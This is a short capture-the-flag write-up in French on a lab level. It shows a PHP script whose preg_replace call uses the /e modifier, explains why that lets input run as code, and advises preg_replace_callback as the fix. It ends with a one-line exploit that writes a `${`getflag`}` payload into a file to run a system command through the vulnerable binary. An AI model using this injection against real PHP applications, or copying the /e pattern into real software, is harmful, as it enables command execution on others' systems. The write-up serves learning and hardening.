## Défi 6  php script + Eploit = **les variables dynamiques** et **l'exécution de commandes système**

### Commandes réalisées

```bash
cat level06.php
```

### The Outputs
#### level.php
* 
```php
#!/usr/bin/php
# replace . with x and @ with y
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
# read file y, replace [x ...] by y( .*) replace [ and ] with a
# cmd exploit will be executed when y is called
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // Substitue les motifs et exécute 'y' sur le contenu extrait ;(.x) -> tout ce qu' il y a entre [x et ] /e -> exexcute le code reçu comme du code php  ; \2 = le groupe capturé 
    $a = preg_replace("/\[/", "(", $a); // Remplace '[' par '(
    $a = preg_replace("/\]/", ")", $a); // Remplace ']' par ')'
    return $a;
}
# calls x function with the two command line argument
$r = x($argv[1], $argv[2]);
print $r;
?>
```

**Les backticks (\`) permettent d'exécuter une commande système**

* **Éviter `/e`** : Cette option est dépréciée à partir de PHP 5.5 et complètement supprimée depuis PHP 7.0. **le texte de remplacement n'est pas traité comme une simple chaîne, mais est interprété et exécuté comme du code PHP  

* Les backticks (`\`...``) sont considérés comme obsolètes dans PHP moderne. Il est recommandé d'utiliser la fonction` shell_exec()`ou`exec()` à la place.  

* preg_replace_callback -> safer

### Exploit
```bash
echo '[x ${`getflag`}]' > /tmp/flag06  ; ./level06 /tmp/flag06
```

